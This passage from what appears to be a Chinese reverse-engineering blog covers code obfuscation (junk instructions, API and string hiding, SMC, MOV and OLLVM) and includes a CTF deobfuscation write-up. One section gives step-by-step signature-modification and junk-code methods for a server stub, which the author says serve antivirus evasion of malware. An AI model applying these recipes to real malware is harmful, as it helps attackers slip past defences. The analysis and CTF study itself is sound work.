3</span><br><span class="line">    jmp exit</span><br><span class="line">ins1_label: </span><br><span class="line">    instruction 1</span><br><span class="line">    jmp ins2_label</span><br><span class="line">exit:</span><br></pre></td></tr></table></figure><h3 id="使用间接指针"><a href="#使用间接指针" class="headerlink" title="使用间接指针"></a>使用间接指针</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dummy_data1 db 100h dup (0)</span><br><span class="line">message1 db ’hello world’,0</span><br><span class="line"></span><br><span class="line">dummy_data2 db 200h dup (0)</span><br><span class="line">message2 db ’another message’,0</span><br><span class="line"></span><br><span class="line">func proc</span><br><span class="line">    ...</span><br><span class="line">    mov eax, offset dummy_data1 ; PE or ELF reloc here</span><br><span class="line">    add eax, 100h</span><br><span class="line">    push eax</span><br><span class="line">    call dump_string</span><br><span class="line">    ...</span><br><span class="line">    mov eax, offset dummy_data2 ; PE or ELF reloc here</span><br><span class="line">    add eax, 200h</span><br><span class="line">    push eax</span><br><span class="line">    call dump_string</span><br><span class="line">    ...</span><br><span class="line">func endp</span><br></pre></td></tr></table></figure><p>IDA仅会显示dummy_data1和dummy_data2的引用，但无法引导到文本字符串，全局变量甚至是函数的访问方式都可能使用这种方法以达到混淆代码的目地。</p><h3 id="虚拟机-伪代码"><a href="#虚拟机-伪代码" class="headerlink" title="虚拟机/伪代码"></a>虚拟机/伪代码</h3><p>程序员可能写一个PL或者ISA来解释程序(例如Visual Basic 5.0与之前的版本, .NET, Java machine)。这使得逆向工程不得不花费更多的时间去了解这些语言它们的所有ISP指令详细信息。更有甚者，他们可能需要编写其中某些语言的反汇编器。</p><h2 id="加花方法"><a href="#加花方法" class="headerlink" title="加花方法"></a>加花方法</h2><p>加花的方法：<br>1.去头加花，又分为直接去头.头前加花.头后加花。<br>2.加区加花.</p><p>修改方法</p><p>1.去除法<br>2.替换法<br>3.添加法<br>4.跳转法<br>5.移位法</p><p>特征码修改的几种方法.</p><p>常见的修改办法：</p><ol><li>大小写替换法(可识别的字符.当然 函数表是除外的)</li><li>加1减1法</li><li>用 00 填充</li><li>跳转法(把特征码用 汇编语言跳到空白区域)</li><li>上下代码互换.</li><li>改相等含义的代码.</li></ol><p>1.直接加花</p><p>记住入口点—找零区域—NOP填充—记住新入口点—编写花指令跳转回原入口点—保存文件— lordPE修改新入口点</p><p>2.去头加花</p><p>首先我们配置一个无壳的服务端，然后用OD载入后记下从入口点地址开始往下选择几处然后复制，再NOP掉，然后找到空白区域，写一些比如跳转的花指令代码后再把NOP掉的写上，再跳转回刚刚NOP掉的入口点下面的代码地址。</p><p>3.加多重花</p><p>首先我们配置一个无壳的服务端，然后用OD载入后记下入口点地址然后找到几处空白地址，当然这个大家可以找多处。我这里提供的是给大家一个思路，我就找了2处空白地址。然后我们首先记下第一处空白地址。这个我们记下是新的空白地址，然后第2处空白地址我们记下为跳转2 。最后我们跳到入口点。然后用lordPE修改入口点，至此一个加多重花的服务端就完成了。简单明了就是经过多处零区域的跳转。</p><p>4.加区加花</p><p>首先通过加区段工具给无壳的服务端加一个区段。区段名子随便填写，比如hacker，大小一般填写在50-200 就好了。然后我们用LORDPE打开首先记下入口点。然后选择区段记下新添加的HACKER区段的入口点。因为我们要写花指令，所以我们在入口点设置为HACKER区段的比入口点稍微大点的地址。然后我们在写花指令。通常找不到零区域的时候就可以加区段。<br>                     实际物理地址（OD载入的入口点）= 内存地址（0000F000）+镜象基址（RVA）</p><p>5.壳中加花</p><p>用加壳工具（如ASP ACK壳）给服务端先加一层壳，然后在加花指令。事先记好入口点</p><p>7.壳中加区加花</p><p>加壳—加区段—加花指令    综合了以上所有方法。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>（1）  简单加花<br>实现简单，但是原理比较简单，高手很容易就能去除，一般以消耗攻击者的耐心来达到目的。<br>（2）复杂加花<br>类似于加壳</p><ol><li> 记录程序的原入口点，</li><li> 找到PE文件的空白区域，在空白区域内写入花指令（或者添加新节）</li><li> 把入口点地址改为新入口地址</li><li> 花指令执行完后跳转到原入口点地址<br>在程序执行时，程序将从新的入口地址执行，即花指令先被执行，然后再执行程序原来的入口地址功能。<br>增加了静态分析的难度，提高了代码的信息隐藏效果，该方法一般应用于病毒的免杀中。</li></ol><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">加花后，IDA与OD均反汇编错误</span><br><span class="line">改进后程序：</span><br><span class="line">void Function()</span><br><span class="line">&#123;</span><br><span class="line">  _asm xor eax,eax</span><br><span class="line">  _asm test eax,eax</span><br><span class="line">  _asm  jz label1</span><br><span class="line">  _asm jnz label0</span><br><span class="line">label0:</span><br><span class="line">  _asm __emit   0e8h</span><br><span class="line">label1:</span><br><span class="line">  Input++;</span><br><span class="line">  Output++;</span><br><span class="line">  Input+=Output;</span><br><span class="line">  printf(&quot;函数结果:%d,%d&quot;,Input,Output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="隐藏API"><a href="#隐藏API" class="headerlink" title="隐藏API"></a>隐藏API</h2><p>逆向分析工作人员往往就是通过API在极短时间内获取了大量信息，从而使他们成功定位目标程序的关键代码段。所以隐藏对API 的调用可以有效地提高程序的抗分析能力。 例如一个简单的程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int       nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line">  MessageBox(NULL,&quot;test&quot;,&quot;box&quot;,0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">反汇编代码如下：</span><br><span class="line">.text:00401028                 mov     esi, esp</span><br><span class="line">.text:0040102A                 push    0               ; uType</span><br><span class="line">.text:0040102C                 push    offset Caption  ; &quot;Test&quot;</span><br><span class="line">.text:00401031                 push    offset Text     ; &quot;Reverse Me&quot;</span><br><span class="line">.text:00401036                 push    0               ; hWnd</span><br><span class="line">.text:00401038                 call    ds:MessageBoxA(x,x,x,x)</span><br></pre></td></tr></table></figure><p>目的是让反汇编的代码看不到 ds: MessageBoxA(x,x,x,x) 这样的提示。 </p><p>最基本、最简单的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int       nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line">  /********************************************************</span><br><span class="line">  1. 定义字符串</span><br><span class="line">  ********************************************************/</span><br><span class="line">  TCHAR MsgBoxA[MAX_PATH]=&quot;MessageBoxA&quot;;</span><br><span class="line"></span><br><span class="line">  /********************************************************</span><br><span class="line">  2. 获取MessageBoxA的函数地址</span><br><span class="line">  ********************************************************/</span><br><span class="line">  HMODULE hMod=LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">  MYFUNC func=(MYFUNC)GetProcAddress(hMod,MsgBoxA);//获取MessageBoxA的函数地址。</span><br><span class="line">  func(0,&quot;Reverse Me&quot;,&quot;Test&quot;,0);  //调用MessageBoxA函数。</span><br><span class="line">  FreeLibrary(hMod);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">IDA中（V5.4）</span><br><span class="line">.text:0040102E                 mov     eax, dword ptr ds:aMessageboxa ; &quot;MessageBoxA&quot;</span><br><span class="line">.text:00401033                 mov     dword ptr [ebp+ProcName], eax</span><br><span class="line">.text:00401039                 mov     ecx, dword ptr ds:aMessageboxa+4</span><br><span class="line">.text:0040103F                 mov     [ebp+var_100], ecx</span><br><span class="line">.text:00401045                 mov     edx, dword ptr ds:aMessageboxa+8</span><br><span class="line">.text:0040104B                 mov     [ebp+var_FC], edx</span><br><span class="line">.text:00401051                 mov     ecx, 3Eh</span><br><span class="line">.text:00401056                 xor     eax, eax</span><br><span class="line">.text:00401058                 lea     edi, [ebp+var_F8]</span><br><span class="line">.text:0040105E                 rep stosd</span><br><span class="line">.text:00401060                 mov     esi, esp</span><br><span class="line">.text:00401062                 push    offset LibFileName ; &quot;user32.dll&quot;</span><br><span class="line">.text:00401067                 call    ds:__imp__LoadLibraryA@4 ; LoadLibraryA(x)</span><br><span class="line">.text:0040106D                 cmp     esi, esp</span><br><span class="line">.text:0040106F                 call    __chkesp</span><br><span class="line">.text:00401074                 mov     [ebp+hLibModule], eax</span><br><span class="line">.text:0040107A                 mov     esi, esp</span><br><span class="line">.text:0040107C                 lea     eax, [ebp+ProcName]</span><br><span class="line">.text:00401082                 push    eax             ; lpProcName</span><br><span class="line">.text:00401083                 mov     ecx, [ebp+hLibModule]</span><br><span class="line">.text:00401089                 push    ecx             ; hModule</span><br><span class="line">.text:0040108A                 call    ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)</span><br><span class="line">.text:00401090                 cmp     esi, esp</span><br><span class="line">.text:00401092                 call    __chkesp</span><br><span class="line">.text:00401097                 mov     [ebp+var_10C], eax</span><br><span class="line">.text:0040109D                 mov     esi, esp</span><br><span class="line">.text:0040109F                 push    0</span><br><span class="line">.text:004010A1                 push    offset aTest    ; &quot;Test&quot;</span><br><span class="line">.text:004010A6                 push    offset aReverseMe ; &quot;Reverse Me&quot;</span><br><span class="line">.text:004010AB                 push    0</span><br><span class="line">.text:004010AD                 call    [ebp+var_10C]</span><br><span class="line">OD中：</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>进行简单加密处理 隐藏字符串”MessageBoxA”，”Reverse Me”，”Test”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int       nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line">  /********************************************************</span><br><span class="line">  1. 加密字符串</span><br><span class="line">  ********************************************************/</span><br><span class="line">  char MsgBoxA[]=&#123;0x5c,0x74,0x62,0x62,0x70,0x76,0x74,0x53,0x7e,0x69,0x50,0x00&#125;;</span><br><span class="line">  //字符串&quot;MessageBoxA&quot;的加密形式。</span><br><span class="line">  char lpText[]=&#123;0x43,0x74,0x67,0x74,0x63,0x62,0x74,0x31,0x5C,0x74,0x00&#125;; </span><br><span class="line">  //字符串&quot;Reverse Me&quot;的加密形式。</span><br><span class="line">  char lpCaption[]=&#123;0x45,0x74,0x62,0x65,0x00&#125;; </span><br><span class="line">  //字符串&quot;Test&quot;的加密形式。</span><br><span class="line"></span><br><span class="line">  /********************************************************</span><br><span class="line">  2. 解密字符串</span><br><span class="line">  ********************************************************/</span><br><span class="line">  for(int i=0;i&lt;strlen(MsgBoxA);i++)  </span><br><span class="line">    MsgBoxA[i]^=0x11;  //解密字符串&quot;MessageBoxA&quot;</span><br><span class="line">  for(i=0;i&lt;strlen(lpText);i++)    </span><br><span class="line">    lpText[i]^=0x11;  //解密字符串&quot;Reverse Me&quot;  </span><br><span class="line">  for(i=0;i&lt;strlen(lpCaption);i++)  </span><br><span class="line">    lpCaption[i]^=0x11;  //解密字符串&quot;Test&quot;</span><br><span class="line"></span><br><span class="line">  /********************************************************</span><br><span class="line">  3. 获取MessageBoxA的函数地址</span><br><span class="line">  ********************************************************/</span><br><span class="line">  HMODULE hMod=LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">  if(hMod)</span><br><span class="line">  &#123;</span><br><span class="line">    MYFUNC func=(MYFUNC)GetProcAddress(hMod,MsgBoxA); //获取MessageBoxA()的函数地址。</span><br><span class="line">    func(0,lpText,lpCaption,0);  //调用MessageBoxA函数。</span><br><span class="line">    FreeLibrary(hMod);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125; </span><br><span class="line">IDA中：</span><br><span class="line">.text:0040146E                 mov     edx, [ebp+arg_8]</span><br><span class="line">.text:00401471                 push    edx</span><br><span class="line">.text:00401472                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:00401475                 push    eax</span><br><span class="line">.text:00401476                 push    offset s_SecondChanceA ; &quot;Second Chance Assertion Failed: File %s&quot;...</span><br><span class="line">.text:0040147B                 lea     ecx, [ebp+OutputString]</span><br><span class="line">.text:00401481                 push    ecx</span><br><span class="line">.text:00401482                 call    dword_4235D0</span><br><span class="line">OD中：</span><br><span class="line"> </span><br><span class="line">3.将GetProcAddress也隐藏</span><br><span class="line">类似上面的方法</span><br><span class="line">4.简单的SMC</span><br></pre></td></tr></table></figure><h1 id="未完成-还会更新的"><a href="#未完成-还会更新的" class="headerlink" title="未完成 还会更新的"></a>未完成 还会更新的</h1><p>如果我记得的话</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-III/Chapter-50.html">re-for-beginners/花指令</a></p><p><a href="https://www.pediy.com/kssd/pediy11/118341.html">看雪/反调试总结</a></p><p><a href="https://www.anquanke.com/post/id/236490">花指令总结</a> 大佬写的花指令总结，很顶、看的很爽</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈指针平衡</title>
      <link href="/2021/12/07/Re/reverse_obfuscation/%E6%A0%88%E6%8C%87%E9%92%88%E5%B9%B3%E8%A1%A1/"/>
      <url>/2021/12/07/Re/reverse_obfuscation/%E6%A0%88%E6%8C%87%E9%92%88%E5%B9%B3%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="栈指针平衡"><a href="#栈指针平衡" class="headerlink" title="栈指针平衡"></a>栈指针平衡</h1><p>当我们在静态分析时，想用F5查看伪代码是，结构会出现一个warring</p><p>positive sp value has been found</p><p>每条语句前的栈指针是这条语句未执行的栈指针。我们在IDA中使用Ait+K就可以修改栈指针</p><p>为什么会产生栈指针不平衡呢？这可能就是IDA的一个漏洞吧，但是又无可避免。在IDA官网上有这么一段解释：</p><p>IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注”sp-analysis failed”。一般编程中，不同的函数调用约定(如stdcall&amp;_cdcel call)可能会出现这种情况；另外，为了实现代码保护而加入代码混淆(特指用push/push+ret实现函数调用)技术也会出现这种情况。</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC</title>
      <link href="/2021/12/07/Re/reverse_obfuscation/SMC/"/>
      <url>/2021/12/07/Re/reverse_obfuscation/SMC/</url>
      
        <content type="html"><![CDATA[<h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><p>SMC（Self-Modifying Code）（自解码），可以在一段代码执行前对它进行修改。常常利用这个特性，把代码以加密的形式保存在可自行文件中，然后在程序执行的时候进行动态解析。这样我们在采用静态分析时，看到的都是加密的内容，从而阻断了静态调试的可能性。<br>SMC的执行流程如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190719011717-e4b65ad2-a97f-1.png" alt="img"></p><p>对SMC有个大致的理解，为了更好的理解这种反静态调试手段</p><p>SMC自解码，可以针对部分代码进行加密，在运行到这段代码时，就对该段代码解密。 当我们遇到这样的题目就可以采取静态分析与动态分析结合的方式</p><h2 id="MOV混淆"><a href="#MOV混淆" class="headerlink" title="MOV混淆"></a>MOV混淆</h2><p>MOV这种混淆是怎样产生的呢？剑桥大学的Stephen Dolan证明了x86的mov指令可以完成几乎所有功能了（可能还需要jmp），其他指令都是“多余的”。受此启发，有个大牛做了一个虚拟机加密编译器。它是一个修改版的LCC编译器，输入是C语言代码，输出的obj里面直接包含了虚拟机加密后的代码。如它的名字，函数的所有代码只有mov指令，没有其他任何指令。这个加密编译器在网上是开源的项目。<br>这里是这个编译器开源项目的地址，有兴趣的小伙伴可以配置来玩玩。<br><a href="https://github.com/xoreaxeaxeax/movfuscator">https://github.com/xoreaxeaxeax/movfuscator</a></p><p>通过做题 总结：</p><p>1、 字符串的搜索是给我们最好的提示。<br>2、 MOV混淆是不会混淆函数的逻辑的。因此函数的逻辑还是不变的。<br>3、 大多数汇编代码的意思是可以猜测的。可以大概推测出具体操作了什么。<br>在这里我提供一个开源的工具，是针对这的MOV混淆的工具<br>地址：<a href="https://github.com/kirschju/demovfuscator">https://github.com/kirschju/demovfuscator</a><br>这个工具可以很好的帮助我们分析MOV混淆。</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OLLVM混淆</title>
      <link href="/2021/12/07/Re/reverse_obfuscation/OLLVM%E6%B7%B7%E6%B7%86/"/>
      <url>/2021/12/07/Re/reverse_obfuscation/OLLVM%E6%B7%B7%E6%B7%86/</url>
      
        <content type="html"><![CDATA[<h1 id="OLLVM混淆"><a href="#OLLVM混淆" class="headerlink" title="OLLVM混淆"></a>OLLVM混淆</h1><p>LLVM是构架编译器(compiler)的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。</p><h2 id="去OLLVM"><a href="#去OLLVM" class="headerlink" title="去OLLVM"></a>去OLLVM</h2><p>使用<a href="https://github.com/cq674350529/deflat">deflat.py</a>反混淆</p><p>使用方法： python deflat.py -f path/to/binary –addr hexaddress </p><p>path/to/binary填文件，hexaddress填函数入口地址。 </p><p>python deflat.py -f /home/phantomor/Desktop/EasyRe –addr  0x400A0D</p><h2 id="安洵杯-2019-game"><a href="#安洵杯-2019-game" class="headerlink" title="[安洵杯 2019]game"></a>[安洵杯 2019]game</h2><p>打开一看是个Sudoku题，</p><p>点开函数一看</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/RE/obf/image-20211203183235760.png" alt="image1"></p><p>使用上述工具对主要函数去混淆check1、check3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">check1</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+6Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+6Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> k; </span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>; ++i ) <span class="comment">//移位</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[v5];</span><br><span class="line">    a1[v5] = a1[i];</span><br><span class="line">    a1[i] = v3;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a1); j += <span class="number">2</span> ) <span class="comment">//移位</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1[j];</span><br><span class="line">    a1[j] = a1[j + <span class="number">1</span>];</span><br><span class="line">    a1[j + <span class="number">1</span>] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( k &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[k] = (a1[k] &amp; <span class="number">0xF3</span> | ~a1[k] &amp; <span class="number">0xC</span>) - <span class="number">20</span>; <span class="comment">//加密操作</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">check3</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">check2</span>(a1) )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;you get it!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">最后把Sudoku做好</span><br><span class="line"><span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span></span><br><span class="line"><span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span></span><br><span class="line"><span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span></span><br><span class="line"><span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span></span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">4693641762894685722843556137219876255986</span></span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[] = <span class="string">&quot;4693641762894685722843556137219876255986&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a[i] + <span class="number">20</span>;</span><br><span class="line">        temp = temp &amp; <span class="number">0xf3</span> | ~temp &amp; <span class="number">0xc</span>;</span><br><span class="line">        a[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a[i];</span><br><span class="line">        a[i] = a[i + <span class="number">1</span>];</span><br><span 